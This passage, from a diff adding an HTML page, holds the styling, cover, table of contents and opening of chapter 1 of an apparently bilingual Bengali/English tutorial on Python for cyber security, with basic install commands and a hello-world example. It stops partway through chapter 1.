@@ -1,0 +1,1918 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Python for Security — সম্পূর্ণ গাইড</title>
+<link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg: #f5f0e8;
+  --surface: #faf7f2;
+  --surface2: #ede8df;
+  --border: #d4c9b8;
+  --accent: #c0392b;
+  --accent2: #2980b9;
+  --accent3: #27ae60;
+  --accent4: #d35400;
+  --accent5: #8e44ad;
+  --text: #2c2416;
+  --text-dim: #7a6a54;
+  --text-bright: #1a1008;
+  --code-bg: #1e1b16;
+  --code-text: #e8dcc8;
+  --yellow: #f39c12;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+  font-family: 'Hind Siliguri', sans-serif;
+  background: var(--bg);
+  color: var(--text);
+  font-size: 14px;
+  line-height: 1.9;
+}
+
+/* ══ BILINGUAL ══ */
+.en-text { display: none; }
+.bn-text { display: inline; }
+body.lang-en .bn-text { display: none; }
+body.lang-en .en-text { display: inline; }
+.en-block { display: none; }
+.bn-block { display: block; }
+body.lang-en .bn-block { display: none; }
+body.lang-en .en-block { display: block; }
+
+/* ══ DARK MODE ══ */
+body.dark-mode {
+  --bg: #12100c;
+  --surface: #1a1710;
+  --surface2: #221f17;
+  --border: #3a3428;
+  --text: #e0d4c0;
+  --text-dim: #8a7a64;
+  --text-bright: #f0e8d8;
+  --code-bg: #0c0a07;
+  --code-text: #e8dcc8;
+  --accent: #e74c3c;
+  --accent2: #3498db;
+  --accent3: #2ecc71;
+  --accent4: #e67e22;
+  --accent5: #9b59b6;
+}
+body.dark-mode .cheat-row { border-color: var(--border); }
+body.dark-mode table td { border-color: var(--border); }
+body.dark-mode tr:nth-child(even) { background: rgba(255,255,255,0.03); }
+body.dark-mode .card { background: var(--surface2); }
+body.dark-mode .info { background: rgba(41,128,185,0.1); }
+body.dark-mode .warn { background: rgba(243,156,18,0.1); }
+body.dark-mode .danger { background: rgba(192,57,43,0.1); }
+body.dark-mode .success { background: rgba(39,174,96,0.1); }
+body.dark-mode .toc { background: var(--surface); }
+
+/* ══ TOP CONTROLS ══ */
+.top-controls {
+  position: fixed; top: 16px; right: 16px;
+  display: flex; gap: 8px; z-index: 9999;
+}
+.ctrl-btn {
+  border: 2px solid var(--border);
+  padding: 8px 16px; border-radius: 4px;
+  font-size: 13px; font-family: 'Syne', sans-serif;
+  cursor: pointer; font-weight: 700;
+  transition: all 0.2s; letter-spacing: 0.3px;
+  background: var(--surface);
+  color: var(--text);
+}
+.print-btn { border-color: var(--accent); color: var(--accent); }
+.print-btn:hover { background: var(--accent); color: #fff; }
+.theme-btn { border-color: var(--accent4); color: var(--accent4); }
+.theme-btn:hover { background: var(--accent4); color: #fff; }
+.lang-btn { border-color: var(--accent2); color: var(--accent2); }
+.lang-btn:hover { background: var(--accent2); color: #fff; }
+
+/* ══ COVER ══ */
+.cover {
+  min-height: 100vh;
+  background: var(--code-bg);
+  display: flex; flex-direction: column;
+  align-items: center; justify-content: center;
+  text-align: center; padding: 80px 40px;
+  page-break-after: always; position: relative; overflow: hidden;
+}
+.cover-lines {
+  position: absolute; inset: 0; opacity: 0.07;
+  background: repeating-linear-gradient(
+    0deg, transparent, transparent 28px,
+    #c0392b 28px, #c0392b 29px
+  );
+}
+.cover-snake {
+  font-size: 80px; margin-bottom: 20px;
+  filter: drop-shadow(0 0 30px rgba(192,57,43,0.5));
+  position: relative;
+}
+.cover h1 {
+  font-family: 'Syne', sans-serif;
+  font-size: 58px; font-weight: 800;
+  color: #e8dcc8;
+  line-height: 1; margin-bottom: 6px;
+  position: relative; letter-spacing: -1px;
+}
+.cover h1 span { color: var(--accent); }
+.cover-sub {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 14px; color: rgba(200,180,150,0.6);
+  letter-spacing: 3px; text-transform: uppercase;
+  margin-bottom: 25px; position: relative;
+}
+.cover-divider {
+  width: 80px; height: 3px;
+  background: var(--accent);
+  margin: 18px auto 25px; position: relative;
+}
+.cover-desc {
+  font-size: 15px; color: rgba(200,180,150,0.65);
+  max-width: 600px; line-height: 2; margin-bottom: 35px;
+  position: relative;
+}
+.cover-terminal {
+  background: rgba(0,0,0,0.5);
+  border: 1px solid rgba(192,57,43,0.3);
+  border-top: 3px solid var(--accent);
+  border-radius: 6px; padding: 20px 28px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 13px; color: #c0a882;
+  text-align: left; max-width: 500px; width: 100%;
+  position: relative; margin-bottom: 30px;
+}
+.t-bar { display: flex; gap: 7px; margin-bottom: 14px; }
+.dot { width: 10px; height: 10px; border-radius: 50%; }
+.dot-r { background: #ff5f56; }
+.dot-y { background: #ffbd2e; }
+.dot-g { background: #27c93f; }
+.t-prompt { color: var(--accent); }
+.t-kw { color: #e5c07b; }
+.t-str { color: #98c379; }
+.t-out { color: rgba(180,200,160,0.8); }
+.cover-tags { display: flex; flex-wrap: wrap; gap: 8px; justify-content: center; position: relative; }
+.ctag {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px; padding: 4px 12px;
+  border-radius: 3px; border: 1px solid;
+}
+.ctag-r { color: var(--accent); border-color: rgba(192,57,43,0.4); background: rgba(192,57,43,0.08); }
+.ctag-b { color: #5dade2; border-color: rgba(41,128,185,0.4); background: rgba(41,128,185,0.08); }
+.ctag-g { color: #58d68d; border-color: rgba(39,174,96,0.4); background: rgba(39,174,96,0.08); }
+.ctag-y { color: #f7dc6f; border-color: rgba(243,156,18,0.4); background: rgba(243,156,18,0.08); }
+.ctag-p { color: #c39bd3; border-color: rgba(142,68,173,0.4); background: rgba(142,68,173,0.08); }
+
+/* ══ TOC ══ */
+.toc {
+  background: var(--surface);
+  padding: 55px 65px; page-break-after: always;
+  border-top: 4px solid var(--accent);
+}
+.toc-title {
+  font-family: 'Syne', sans-serif;
+  font-size: 26px; font-weight: 800;
+  color: var(--accent); margin-bottom: 8px;
+  letter-spacing: -0.5px;
+}
+.toc-subtitle {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px; color: var(--text-dim);
+  letter-spacing: 2px; margin-bottom: 35px;
+  text-transform: uppercase;
+}
+.toc-row {
+  display: flex; align-items: flex-start;
+  gap: 16px; padding: 12px 0;
+  border-bottom: 1px solid var(--border);
+  transition: padding-left 0.2s;
+}
+.toc-row:hover { padding-left: 6px; }
+.toc-n {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px; color: var(--accent);
+  min-width: 30px; padding-top: 2px;
+}
+.toc-info { flex: 1; }
+.toc-name {
+  font-family: 'Syne', sans-serif;
+  font-size: 15px; font-weight: 700;
+  color: var(--text-bright); letter-spacing: -0.2px;
+}
+.toc-topics { font-size: 12px; color: var(--text-dim); margin-top: 2px; }
+.toc-lv {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px; padding: 2px 8px;
+  border-radius: 2px; white-space: nowrap; align-self: center;
+}
+
+/* ══ CHAPTERS ══ */
+.chapter { background: var(--surface); page-break-before: always; }
+.chapter-header {
+  padding: 45px 60px; position: relative; overflow: hidden;
+  background: var(--code-bg);
+  border-top: 4px solid var(--accent);
+}
+.ch2 .chapter-header { border-top-color: var(--accent2); }
+.ch3 .chapter-header { border-top-color: var(--accent3); }
+.ch4 .chapter-header { border-top-color: var(--accent4); }
+.ch5 .chapter-header { border-top-color: var(--accent5); }
+.ch6 .chapter-header { border-top-color: var(--accent); }
+.ch7 .chapter-header { border-top-color: var(--accent2); }
+.ch8 .chapter-header { border-top-color: var(--accent3); }
+.ch9 .chapter-header { border-top-color: var(--accent4); }
+.ch10 .chapter-header { border-top-color: var(--accent5); }
+.ch11 .chapter-header { border-top-color: var(--accent); }
+.ch12 .chapter-header { border-top-color: var(--accent2); }
+
+.chapter-header::after {
+  content: attr(data-num);
+  position: absolute; right: 55px; top: 50%;
+  transform: translateY(-50%);
+  font-family: 'Syne', sans-serif;
+  font-size: 110px; font-weight: 800;
+  opacity: 0.05; color: white; line-height: 1;
+}
+.ch-label {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px; letter-spacing: 4px;
+  color: rgba(200,180,150,0.4);
+  text-transform: uppercase; margin-bottom: 10px;
+}
+.ch-title {
+  font-family: 'Syne', sans-serif;
+  font-size: 30px; color: #e8dcc8;
+  font-weight: 800; letter-spacing: -0.5px; line-height: 1.2;
+}
+.ch-desc { font-size: 13px; color: rgba(200,180,150,0.5); margin-top: 8px; }
+.chapter-body { padding: 45px 60px; }
+
+/* ══ HEADINGS ══ */
+h2.sec {
+  font-family: 'Syne', sans-serif;
+  font-size: 20px; font-weight: 800;
+  color: var(--accent); margin: 38px 0 15px;
+  padding-left: 14px; border-left: 4px solid var(--accent);
+  letter-spacing: -0.3px;
+}
+.ch2 h2.sec { color: var(--accent2); border-left-color: var(--accent2); }
+.ch3 h2.sec { color: var(--accent3); border-left-color: var(--accent3); }
+.ch4 h2.sec { color: var(--accent4); border-left-color: var(--accent4); }
+.ch5 h2.sec { color: var(--accent5); border-left-color: var(--accent5); }
+.ch6 h2.sec { color: var(--accent); border-left-color: var(--accent); }
+.ch7 h2.sec { color: var(--accent2); border-left-color: var(--accent2); }
+.ch8 h2.sec { color: var(--accent3); border-left-color: var(--accent3); }
+.ch9 h2.sec { color: var(--accent4); border-left-color: var(--accent4); }
+.ch10 h2.sec { color: var(--accent5); border-left-color: var(--accent5); }
+.ch11 h2.sec { color: var(--accent); border-left-color: var(--accent); }
+.ch12 h2.sec { color: var(--accent2); border-left-color: var(--accent2); }
+
+h3.sub {
+  font-family: 'Syne', sans-serif;
+  font-size: 15px; font-weight: 700;
+  color: var(--text-bright); margin: 24px 0 11px;
+  padding-bottom: 5px; border-bottom: 1px dashed var(--border);
+}
+p { margin-bottom: 14px; text-align: justify; }
+
+/* ══ CODE ══ */
+.code {
+  background: var(--code-bg); color: var(--code-text);
+  padding: 18px 22px; border-radius: 6px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 12.5px; margin: 16px 0; line-height: 1.85;
+  overflow-x: auto; border: 1px solid rgba(255,255,255,0.06);
+  border-left: 3px solid var(--accent);
+}
+.ch2 .code { border-left-color: var(--accent2); }
+.ch3 .code { border-left-color: var(--accent3); }
+.ch4 .code { border-left-color: var(--accent4); }
+.ch5 .code { border-left-color: var(--accent5); }
+.ch7 .code { border-left-color: var(--accent2); }
+.ch8 .code { border-left-color: var(--accent3); }
+.ch9 .code { border-left-color: var(--accent4); }
+.ch10 .code { border-left-color: var(--accent5); }
+.ch11 .code { border-left-color: var(--accent); }
+.ch12 .code { border-left-color: var(--accent2); }
+
+.code .c  { color: #5c6370; font-style: italic; }
+.code .k  { color: #e06c75; }
+.code .kw { color: #c678dd; }
+.code .s  { color: #98c379; }
+.code .n  { color: #e5c07b; }
+.code .f  { color: #61afef; }
+.code .num{ color: #d19a66; }
+.code .p  { color: var(--accent); }
+.code .g  { color: #98c379; }
+.code .b  { color: #61afef; }
+.code .out{ color: rgba(180,200,160,0.7); }
+code {
+  background: rgba(0,0,0,0.12); color: var(--accent);
+  padding: 2px 7px; border-radius: 3px;
+  font-family: 'JetBrains Mono', monospace; font-size: 12.5px;
+  border: 1px solid rgba(0,0,0,0.1);
+}
+body.dark-mode code { background: rgba(255,255,255,0.07); }
+
+/* ══ BOXES ══ */
+.box { padding: 15px 20px; border-radius: 6px; margin: 16px 0; border-left: 4px solid; }
+.info    { background: rgba(41,128,185,0.08);  border-color: var(--accent2); }
+.warn    { background: rgba(243,156,18,0.08);  border-color: var(--yellow);  }
+.danger  { background: rgba(192,57,43,0.08);   border-color: var(--accent);  }
+.success { background: rgba(39,174,96,0.08);   border-color: var(--accent3); }
+.purple-box { background: rgba(142,68,173,0.08); border-color: var(--accent5); }
+.box-t { font-family: 'Syne', sans-serif; font-weight: 700; font-size: 13px; margin-bottom: 7px; }
+
+/* ══ TABLES ══ */
+table { width: 100%; border-collapse: collapse; margin: 16px 0; font-size: 13px; }
+thead tr { background: var(--code-bg); color: #e8dcc8; }
+th { padding: 10px 14px; text-align: left; font-weight: 600; font-family: 'Syne', sans-serif; font-size: 12px; letter-spacing: 0.3px; }
+td { padding: 9px 14px; border-bottom: 1px solid var(--border); }
+tr:nth-child(even) { background: rgba(0,0,0,0.03); }
+tr:hover { background: rgba(192,57,43,0.04); }
+
+/* ══ GRID ══ */
+.grid2 { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; margin: 16px 0; }
+.grid3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 12px; margin: 14px 0; }
+.card {
+  background: var(--surface2); border: 1px solid var(--border);
+  border-radius: 6px; padding: 16px;
+}
+.card h4 {
+  font-family: 'Syne', sans-serif;
+  font-size: 13px; font-weight: 700;
+  margin-bottom: 9px; padding-bottom: 6px;
+  border-bottom: 1px solid var(--border);
+}
+.card.red-card    { border-color: rgba(192,57,43,0.35); }
+.card.red-card h4 { color: var(--accent); }
+.card.blue-card    { border-color: rgba(41,128,185,0.35); }
+.card.blue-card h4 { color: var(--accent2); }
+.card.green-card    { border-color: rgba(39,174,96,0.35); }
+.card.green-card h4 { color: var(--accent3); }
+.card.orange-card    { border-color: rgba(211,84,0,0.35); }
+.card.orange-card h4 { color: var(--accent4); }
+.card.purple-card    { border-color: rgba(142,68,173,0.35); }
+.card.purple-card h4 { color: var(--accent5); }
+
+/* ══ BADGE ══ */
+.badge { display: inline-block; padding: 2px 8px; border-radius: 3px; font-size: 11px; font-weight: 700; margin: 1px; font-family: 'Syne', sans-serif; }
+.badge-r { background: rgba(192,57,43,0.12); color: var(--accent); border: 1px solid rgba(192,57,43,0.25); }
+.badge-b { background: rgba(41,128,185,0.12); color: var(--accent2); border: 1px solid rgba(41,128,185,0.25); }
+.badge-g { background: rgba(39,174,96,0.12); color: var(--accent3); border: 1px solid rgba(39,174,96,0.25); }
+.badge-y { background: rgba(243,156,18,0.12); color: var(--yellow); border: 1px solid rgba(243,156,18,0.25); }
+.badge-p { background: rgba(142,68,173,0.12); color: var(--accent5); border: 1px solid rgba(142,68,173,0.25); }
+
+ul, ol { margin: 10px 0 10px 22px; line-height: 2; }
+li { margin-bottom: 2px; }
+
+/* ══ OUTPUT BOX ══ */
+.output {
+  background: #0a0a0a; color: #a8c090;
+  padding: 12px 18px; border-radius: 4px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 12px; margin: -12px 0 16px;
+  border: 1px solid #1e1e1e; border-top: none;
+  border-top-left-radius: 0; border-top-right-radius: 0;
+  line-height: 1.7;
+}
+.output::before {
+  content: '# Output:';
+  display: block; color: #4a5a40; font-size: 11px; margin-bottom: 6px;
+}
+
+/* ══ CHAPTER SUMMARY ══ */
+.ch-summary {
+  background: var(--code-bg);
+  border-radius: 8px; padding: 24px 28px; margin-top: 40px;
+  border-top: 3px solid var(--accent);
+}
+.ch2 .ch-summary { border-top-color: var(--accent2); }
+.ch3 .ch-summary { border-top-color: var(--accent3); }
+.ch4 .ch-summary { border-top-color: var(--accent4); }
+.ch5 .ch-summary { border-top-color: var(--accent5); }
+.ch-summary h3 {
+  font-family: 'Syne', sans-serif;
+  font-size: 15px; font-weight: 800;
+  color: #e8dcc8; margin-bottom: 14px; letter-spacing: -0.2px;
+}
+.ch-summary li { color: rgba(200,180,150,0.8); }
+
+/* ══ CHEAT SHEET ══ */
+.cheat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin: 16px 0; }
+.cheat-card { background: var(--surface2); border: 1px solid var(--border); border-radius: 6px; overflow: hidden; }
+.cheat-head { padding: 8px 14px; font-family: 'Syne', sans-serif; font-size: 12px; font-weight: 800; color: #fff; letter-spacing: 0.3px; }
+.cheat-row { display: flex; padding: 5px 12px; border-bottom: 1px solid var(--border); font-size: 11.5px; gap: 10px; }
+.cheat-row:last-child { border-bottom: none; }
+.cheat-cmd { font-family: 'JetBrains Mono', monospace; color: var(--accent2); min-width: 160px; white-space: nowrap; font-size: 11px; }
+.cheat-desc { color: var(--text-dim); }
+
+/* ══ STEP BOX ══ */
+.step-box {
+  display: flex; gap: 14px; margin: 14px 0; align-items: flex-start;
+}
+.step-num {
+  min-width: 32px; height: 32px; border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  font-family: 'Syne', sans-serif; font-size: 14px; font-weight: 800;
+  flex-shrink: 0; background: var(--accent); color: white;
+}
+.step-content { flex: 1; padding-top: 4px; }
+.step-title { font-family: 'Syne', sans-serif; font-size: 14px; font-weight: 700; margin-bottom: 4px; }
+
+/* ══ CONCEPT CARD ══ */
+.concept-row { display: flex; align-items: stretch; gap: 0; margin: 10px 0; border-radius: 5px; overflow: hidden; border: 1px solid var(--border); }
+.concept-label { padding: 10px 14px; font-family: 'JetBrains Mono', monospace; font-size: 12px; font-weight: 700; min-width: 130px; display: flex; align-items: center; }
+.concept-val { padding: 10px 14px; flex: 1; font-size: 13px; background: var(--surface); border-left: 1px solid var(--border); }
+
+/* ══ PROGRESS ══ */
+.level-bar { margin: 10px 0; }
+.level-label { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 4px; font-family: 'Syne', sans-serif; font-weight: 600; }
+.level-track { background: var(--border); border-radius: 2px; height: 5px; }
+.level-fill { height: 5px; border-radius: 2px; }
+
+@media (max-width: 768px) {
+  .grid2, .grid3, .cheat-grid { grid-template-columns: 1fr; }
+  .chapter-body, .chapter-header { padding: 25px 20px; }
+  .toc { padding: 30px 20px; }
+}
+@media print {
+  .top-controls { display: none; }
+  .chapter-header { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+  .code, .output { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+}
+</style>
+</head>
+<body>
+
+<div class="top-controls">
+  <button class="print-btn ctrl-btn" onclick="window.print()">🖨️ PDF</button>
+  <button class="theme-btn ctrl-btn" onclick="toggleTheme()" id="themeBtn">🌙 Dark</button>
+  <button class="lang-btn ctrl-btn" onclick="toggleLang()" id="langBtn">🇬🇧 English</button>
+</div>
+
+<!-- ══ COVER ══ -->
+<div class="cover">
+  <div class="cover-lines"></div>
+  <div class="cover-snake">🐍</div>
+  <div class="cover-sub"><span class="bn-text">সাইবার সিকিউরিটির জন্য</span><span class="en-text">for cyber security</span></div>
+  <h1><span>Python</span></h1>
+  <h1 style="font-size:28px; color:rgba(200,180,150,0.5); font-weight:600; margin-top:6px;">
+    <span class="bn-text">Basics থেকে Security Scripting</span>
+    <span class="en-text">Basics to Security Scripting</span>
+  </h1>
+  <div class="cover-divider"></div>
+  <p class="cover-desc">
+    <span class="bn-text">Python-এর একদম শুরু থেকে — Variable, Loop, Function থেকে শুরু করে Network Scanner, Password Cracker, Web Scraper এবং Security Automation Script পর্যন্ত সম্পূর্ণ গাইড।</span>
+    <span class="en-text">From the very beginning of Python — Variables, Loops, Functions all the way to Network Scanners, Password Crackers, Web Scrapers, and Security Automation Scripts.</span>
+  </p>
+  <div class="cover-terminal">
+    <div class="t-bar">
+      <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+    </div>
+    <div><span class="t-prompt">>>>  </span><span class="t-kw">print</span>(<span class="t-str">"<span class="bn-text">হ্যালো, হ্যাকার!</span><span class="en-text">Hello, Hacker!</span>"</span>)</div>
+    <div class="t-out"><span class="bn-text">হ্যালো, হ্যাকার!</span><span class="en-text">Hello, Hacker!</span></div>
+    <div style="margin-top:8px;"><span class="t-prompt">>>>  </span><span class="t-kw">import</span> <span class="t-str">security</span></div>
+    <div class="t-out">[+] <span class="bn-text">Python শেখা শুরু হলো...</span><span class="en-text">Python learning started...</span></div>
+  </div>
+  <div class="cover-tags">
+    <span class="ctag ctag-r">Variables & Types</span>
+    <span class="ctag ctag-b">Loops & Conditions</span>
+    <span class="ctag ctag-g">Functions</span>
+    <span class="ctag ctag-y">File Handling</span>
+    <span class="ctag ctag-p">OOP Basics</span>
+    <span class="ctag ctag-r">Networking (socket)</span>
+    <span class="ctag ctag-b">Port Scanner</span>
+    <span class="ctag ctag-g">Web Scraping</span>
+    <span class="ctag ctag-y">Password Tools</span>
+    <span class="ctag ctag-p">Automation Scripts</span>
+  </div>
+</div>
+
+<!-- ══ TOC ══ -->
+<div class="toc">
+  <div class="toc-title">📋 <span class="bn-text">বিষয়সূচি</span><span class="en-text">Table of Contents</span></div>
+  <div class="toc-subtitle">// Python for Security — Complete Roadmap //</div>
+
+  <div class="toc-row">
+    <span class="toc-n">01</span>
+    <div class="toc-info">
+      <div class="toc-name"><span class="bn-text">Python পরিচিতি ও Setup</span><span class="en-text">Python Intro & Setup</span></div>
+      <div class="toc-topics"><span class="bn-text">Python কী, কেন শিখব, Install, IDLE, VS Code</span><span class="en-text">What is Python, why learn, Install, IDLE, VS Code</span></div>
+    </div>
+    <span class="toc-lv badge-g">BEGINNER</span>
+  </div>
+
+  <div class="toc-row">
+    <span class="toc-n">02</span>
+    <div class="toc-info">
+      <div class="toc-name"><span class="bn-text">Variable, Data Types ও Input/Output</span><span class="en-text">Variables, Data Types & Input/Output</span></div>
+      <div class="toc-topics">int, float, str, bool, list, tuple, dict, set, print(), input()</div>
+    </div>
+    <span class="toc-lv badge-g">BEGINNER</span>
+  </div>
+
+  <div class="toc-row">
+    <span class="toc-n">03</span>
+    <div class="toc-info">
+      <div class="toc-name"><span class="bn-text">Operators, Conditions ও Loops</span><span class="en-text">Operators, Conditions & Loops</span></div>
+      <div class="toc-topics">if/elif/else, for, while, break, continue, range()</div>
+    </div>
+    <span class="toc-lv badge-g">BEGINNER</span>
+  </div>
+
+  <div class="toc-row">
+    <span class="toc-n">04</span>
+    <div class="toc-info">
+      <div class="toc-name"><span class="bn-text">Functions ও Modules</span><span class="en-text">Functions & Modules</span></div>
+      <div class="toc-topics">def, return, *args, **kwargs, import, os, sys, re</div>
+    </div>
+    <span class="toc-lv badge-b">INTERMEDIATE</span>
+  </div>
+
+  <div class="toc-row">
+    <span class="toc-n">05</span>
+    <div class="toc-info">
+      <div class="toc-name"><span class="bn-text">File Handling ও Exception</span><span class="en-text">File Handling & Exceptions</span></div>
+      <div class="toc-topics">open(), read/write, try/except, with statement</div>
+    </div>
+    <span class="toc-lv badge-b">INTERMEDIATE</span>
+  </div>
+
+  <div class="toc-row">
+    <span class="toc-n">06</span>
+    <div class="toc-info">
+      <div class="toc-name"><span class="bn-text">Networking — Socket Programming</span><span class="en-text">Networking — Socket Programming</span></div>
+      <div class="toc-topics">socket module, TCP/UDP, Banner Grabbing, Port Scanner তৈরি</div>
+    </div>
+    <span class="toc-lv badge-b">INTERMEDIATE</span>
+  </div>
+
+  <div class="toc-row">
+    <span class="toc-n">07</span>
+    <div class="toc-info">
+      <div class="toc-name"><span class="bn-text">Web Scraping ও HTTP Requests</span><span class="en-text">Web Scraping & HTTP Requests</span></div>
+      <div class="toc-topics">requests, BeautifulSoup, Login Bypass Testing, Form Fuzzing</div>
+    </div>
+    <span class="toc-lv badge-b">INTERMEDIATE</span>
+  </div>
+
+  <div class="toc-row">
+    <span class="toc-n">08</span>
+    <div class="toc-info">
+      <div class="toc-name"><span class="bn-text">Password ও Hashing Tools</span><span class="en-text">Password & Hashing Tools</span></div>
+      <div class="toc-topics">hashlib, MD5/SHA, Password Generator, Dictionary Attacker</div>
+    </div>
+    <span class="toc-lv badge-r">SECURITY</span>
+  </div>
+
+  <div class="toc-row">
+    <span class="toc-n">09</span>
+    <div class="toc-info">
+      <div class="toc-name"><span class="bn-text">OS ও System Interaction</span><span class="en-text">OS & System Interaction</span></div>
+      <div class="toc-topics">os, subprocess, shutil, sys — System Recon Script</div>
+    </div>
+    <span class="toc-lv badge-r">SECURITY</span>
+  </div>
+
+  <div class="toc-row">
+    <span class="toc-n">10</span>
+    <div class="toc-info">
+      <div class="toc-name"><span class="bn-text">Automation ও Scripting</span><span class="en-text">Automation & Scripting</span></div>
+      <div class="toc-topics"><span class="bn-text">Log Parser, IP Scanner, Brute Force Automator</span><span class="en-text">Log Parser, IP Scanner, Brute Force Automator</span></div>
+    </div>
+    <span class="toc-lv badge-r">SECURITY</span>
+  </div>
+
+  <div class="toc-row">
+    <span class="toc-n">11</span>
+    <div class="toc-info">
+      <div class="toc-name"><span class="bn-text">Security Libraries ও Tools</span><span class="en-text">Security Libraries & Tools</span></div>
+      <div class="toc-topics">scapy, paramiko, pwntools, cryptography — Advanced</div>
+    </div>
+    <span class="toc-lv badge-p">ADVANCED</span>
+  </div>
+
+  <div class="toc-row">
+    <span class="toc-n">12</span>
+    <div class="toc-info">
+      <div class="toc-name"><span class="bn-text">Cheat Sheet — সম্পূর্ণ রেফারেন্স</span><span class="en-text">Cheat Sheet — Complete Reference</span></div>
+      <div class="toc-topics"><span class="bn-text">Syntax, Built-ins, Security Commands — সব এক জায়গায়</span><span class="en-text">Syntax, Built-ins, Security Commands — all in one place</span></div>
+    </div>
+    <span class="toc-lv badge-y">CHEAT</span>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     CH 1: INTRO & SETUP
+══════════════════════════════════════ -->
+<div class="chapter ch1">
+  <div class="chapter-header" data-num="01">
+    <div class="ch-label">CHAPTER 01</div>
+    <div class="ch-title">🐍 <span class="bn-text">Python পরিচিতি ও Setup</span><span class="en-text">Python Intro & Setup</span></div>
+    <div class="ch-desc"><span class="bn-text">Python কী, কেন Cyber Security-তে Python, এবং কীভাবে শুরু করবে</span><span class="en-text">What is Python, why Python in Cyber Security, and how to get started</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">Python কী?</span><span class="en-text">What is Python?</span></h2>
+    <p><span class="bn-text">Python হলো একটি high-level, interpreted programming language যা ১৯৯১ সালে <strong>Guido van Rossum</strong> তৈরি করেন। এর syntax অনেক সহজ এবং পড়তে ইংরেজির মতো মনে হয়। Cyber Security জগতে Python সবচেয়ে বেশি ব্যবহৃত ভাষা।</span><span class="en-text">Python is a high-level, interpreted programming language created by <strong>Guido van Rossum</strong> in 1991. Its syntax is very simple and reads almost like English. Python is the most widely used language in the Cyber Security world.</span></p>
+
+    <div class="grid3">
+      <div class="card red-card">
+        <h4>⚡ <span class="bn-text">কেন Python?</span><span class="en-text">Why Python?</span></h4>
+        <ul style="font-size:12.5px;">
+          <li><span class="bn-text">শেখা সহজ</span><span class="en-text">Easy to learn</span></li>
+          <li><span class="bn-text">Security tools-এ ব্যাপক ব্যবহার</span><span class="en-text">Widely used in security tools</span></li>
+          <li><span class="bn-text">Rapid scripting</span><span class="en-text">Rapid scripting</span></li>
+          <li><span class="bn-text">বিশাল library</span><span class="en-text">Huge library ecosystem</span></li>
+          <li><span class="bn-text">Cross-platform</span><span class="en-text">Cross-platform</span></li>
+        </ul>
+      </div>
+      <div class="card blue-card">
+        <h4>🔒 <span class="bn-text">Security-তে Python</span><span class="en-text">Python in Security</span></h4>
+        <ul style="font-size:12.5px;">
+          <li><span class="bn-text">Port Scanner তৈরি</span><span class="en-text">Build Port Scanners</span></li>
+          <li><span class="bn-text">Exploit development</span><span class="en-text">Exploit development</span></li>
+          <li><span class="bn-text">Malware analysis</span><span class="en-text">Malware analysis</span></li>
+          <li><span class="bn-text">Password cracking</span><span class="en-text">Password cracking</span></li>
+          <li><span class="bn-text">Log analysis</span><span class="en-text">Log analysis</span></li>
+        </ul>
+      </div>
+      <div class="card green-card">
+        <h4>🛠️ <span class="bn-text">বিখ্যাত Python Tools</span><span class="en-text">Famous Python Tools</span></h4>
+        <ul style="font-size:12.5px;">
+          <li><strong>Impacket</strong> — <span class="bn-text">Network protocols</span><span class="en-text">Network protocols</span></li>
+          <li><strong>Scapy</strong> — <span class="bn-text">Packet manipulation</span><span class="en-text">Packet manipulation</span></li>
+          <li><strong>Volatility</strong> — <span class="bn-text">Memory forensics</span><span class="en-text">Memory forensics</span></li>
+          <li><strong>SQLMap</strong> — <span class="bn-text">SQL Injection</span><span class="en-text">SQL Injection</span></li>
+          <li><strong>pwntools</strong> — <span class="bn-text">CTF &amp; exploits</span><span class="en-text">CTF &amp; exploits</span></li>
+        </ul>
+      </div>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Python Install ও Setup</span><span class="en-text">Python Install & Setup</span></h2>
+    <div class="code">
+<span class="c"># Linux (Kali/Ubuntu) — Python already installed</span>
+<span class="p">$</span> python3 --version
+<span class="out">Python 3.11.2</span>
+
+<span class="c"># Windows — Download from python.org</span>
+<span class="c"># ✅ "Add Python to PATH" checkbox tick করো!</span>
+
+<span class="c"># pip — Package Manager</span>
+<span class="p">$</span> pip3 install requests
+<span class="p">$</span> pip3 install beautifulsoup4
+<span class="p">$</span> pip3 install scapy
+
+<span class="c"># Python চালানো</span>
+<span class="p">$</span> python3              <span class="c"># Interactive mode</span>
+<span class="p">$</span> python3 script.py    <span class="c"># Script চালানো</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">প্রথম Python Program</span><span class="en-text">Your First Python Program</span></h2>
+    <div class="code">
+<span class="c"># hello.py</span>
+<span class="kw">print</span>(<span class="s">"<span class="bn-text">হ্যালো, দুনিয়া!</span><span class="en-text">Hello, World!</span>"</span>)
+<span class="kw">print</span>(<span class="s">"Python শেখা শুরু হলো 🐍"</span>)
+    </div>
+    <div class="output"><span class="bn-text">হ্যালো, দুনিয়া!</span><span class="en-text">Hello, World!</span>
+Python শেখা শুরু হলো 🐍</div>
+
+    <div class="box info">
+      <div class="box-t">💡 <span class="bn-text">Editor সাজেশন</span><span class="en-text">Editor Suggestion</span></div>
